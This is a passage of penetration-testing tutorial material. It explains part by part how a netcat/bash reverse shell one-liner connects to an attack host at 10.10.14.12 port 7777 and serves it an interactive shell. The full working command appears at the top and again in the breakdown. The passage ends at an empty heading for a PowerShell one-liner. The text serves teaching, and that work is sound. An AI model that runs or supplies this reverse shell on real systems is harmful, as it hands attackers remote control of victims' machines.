#### One-Liners Examined
##### Netcat/Bash Reverse Shell One-liner

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```


The commands above make up a common one-liner issued on a Linux system to serve a Bash shell on a network socket utilizing a Netcat listener. We used this earlier in the Bind Shells section. It's often copied & pasted but not often understood. Let's break down each portion of the one-liner:

**Remove /tmp/f**

```
rm -f /tmp/f;
```

Removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files. The semi-colon (;) is used to execute the command sequentially.

**Make A Named Pipe**

```
mkfifo /tmp/f;
```

Makes a FIFO named pipe file at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (;) is used to execute the command sequentially.
**Output Redirection**

```
cat /tmp/f |
```

Concatenates the FIFO named pipe file /tmp/f, the pipe (|) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (|).
**Set Shell Options**

```
/bin/bash -i 2>&1 |
```

Specifies the command language interpreter using the -i option to ensure the shell is interactive. 2>&1 ensures the standard error data stream (2) & standard output data stream (1) are redirected to the command following the pipe (|).

**Open a Connection with Netcat**

```
nc 10.10.14.12 7777 > /tmp/f
```

Uses Netcat to send a connection to our attack host 10.10.14.12 listening on port 7777. The output will be redirected (>) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed

#### PowerShell One-liner Explained
